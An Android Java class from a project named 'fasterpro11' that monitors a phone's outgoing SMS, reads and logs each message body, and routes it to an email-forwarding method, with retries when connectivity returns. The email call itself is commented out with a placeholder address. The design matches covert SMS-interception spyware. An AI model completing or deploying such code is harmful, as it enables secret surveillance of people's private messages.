package com.example.fasterpro11;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

import javax.mail.MessagingException;

public class OutgoingSmsObserver extends ContentObserver {

    private static final String TAG = "OutgoingSmsObserver";
    private static final long FORWARD_THRESHOLD_MS = 60000; // 1 minute threshold
    private static final String SMS_URI = "content://sms";
    private static final String SMS_TYPE_OUTGOING = "2";

    private Context context;
    private String lastForwardedMessage;
    private long lastForwardedTimestamp;

    public OutgoingSmsObserver(Handler handler, Context context) {
        super(handler);
        this.context = context;

        IntentFilter filter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
        context.registerReceiver(connectivityReceiver, filter);
    }

    @Override
    public void onChange(boolean selfChange, Uri uri) {
        super.onChange(selfChange, uri);
        Log.d(TAG, "Send SMS detected: " + uri.toString());

        try (Cursor cursor = context.getContentResolver().query(
                Uri.parse(SMS_URI),
                new String[]{"address", "body", "type", "date"},
                "type = ?",
                new String[]{SMS_TYPE_OUTGOING},
                "date DESC"
        )) {

            if (cursor != null && cursor.moveToFirst()) {
                int typeIndex = cursor.getColumnIndex("type");
                int bodyIndex = cursor.getColumnIndex("body");
                int dateIndex = cursor.getColumnIndex("date");

                if (typeIndex != -1 && bodyIndex != -1 && dateIndex != -1) {
                    String type = cursor.getString(typeIndex);
                    String messageBody = cursor.getString(bodyIndex);
                    long messageTimestamp = cursor.getLong(dateIndex);

                    Log.d(TAG, "Send SMS message: " + messageBody);
                    Log.d(TAG, "Message timestamp: " + messageTimestamp);

                    if (SMS_TYPE_OUTGOING.equals(type) && isRecentMessage(messageTimestamp) && !isSameAsLastForwarded(messageBody)) {
                        if (isInternetConnected()) {
                            try {
                                if (!isDuplicateEmail(messageBody)) {
                                    forwardSmsByEmail(messageBody);
                                    Log.d(TAG, "Outgoing SMS forwarded successfully via email");
                                    updateLastForwarded(messageBody);
                                } else {
                                    Log.d(TAG, "Duplicate SMS within 2 minutes, not forwarding via email");
                                }
                            } catch (MessagingException e) {
                                Log.e(TAG, "Failed to forward SMS via email: " + e.getMessage(), e);
                            }
                        } else {
                            Log.d(TAG, "No internet connection, skipping forwarding via email");
                        }
                    } else {
                        Log.d(TAG, "Skipping forwarding: Message is not recent or is the same as last forwarded.");
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing outgoing SMS: " + e.getMessage(), e);
        }
    }

    private boolean isRecentMessage(long messageTimestamp) {
        return (System.currentTimeMillis() - messageTimestamp) < FORWARD_THRESHOLD_MS;
    }

    private void forwardSmsByEmail(String messageBody) throws MessagingException {
        // Implementation of email forwarding
        try {
            String sender = SmsReceiver.getSender(); // Get the last sender's info
            // Example: JavaMailAPI_OutgoingSmsObserver_Sender.sendMail("your_email@example.com", "Send SMS from " + sender, "Message: " + messageBody);
        } catch (Exception e) {
            Log.e(TAG, "Error forwarding SMS by email: " + e.getMessage(), e);
            throw new MessagingException("Error forwarding SMS by email", e);
        }
    }

    private boolean isSameAsLastForwarded(String message) {
        return message.equals(lastForwardedMessage);
    }

    private void updateLastForwarded(String message) {
        lastForwardedMessage = message;
        lastForwardedTimestamp = System.currentTimeMillis();
    }

    private boolean isInternetConnected() {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm != null ? cm.getActiveNetworkInfo() : null;
        return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
    }

    private boolean isDuplicateEmail(String currentMessage) {
        return lastForwardedMessage != null && lastForwardedTimestamp != 0 &&
                currentMessage.equals(lastForwardedMessage) &&
                (System.currentTimeMillis() - lastForwardedTimestamp) <= 2 * 60 * 1000; // Within 2 minutes
    }

    private BroadcastReceiver connectivityReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (ConnectivityManager.CONNECTIVITY_ACTION.equals(intent.getAction()) && isInternetConnected()) {
                // Check stored SMS if connected
                SharedPreferences preferences = context.getSharedPreferences("OutgoingSmsStore", Context.MODE_PRIVATE);
                String storedMessage = preferences.getString("messageBody", null);
                if (storedMessage != null) {
                    try {
                        if (!isDuplicateEmail(storedMessage)) {
                            forwardSmsByEmail(storedMessage);
                            Log.d(TAG, "Stored SMS forwarded successfully via email");
                        } else {
                            Log.d(TAG, "Duplicate stored SMS within 2 minutes, not forwarding via email");
                        }
                    } catch (MessagingException e) {
                        Log.e(TAG, "Failed to forward stored SMS via email: " + e.getMessage(), e);
                    }
                    preferences.edit().remove("messageBody").apply(); // Clear stored SMS
                }
            }
        }
    };

    public void unregisterReceiver() {
        try {
            context.unregisterReceiver(connectivityReceiver);
        } catch (IllegalArgumentException e) {
            Log.e(TAG, "Error unregistering receiver: " + e.getMessage(), e);
        }
    }

    public void observeOutgoingSms() {
    }
}
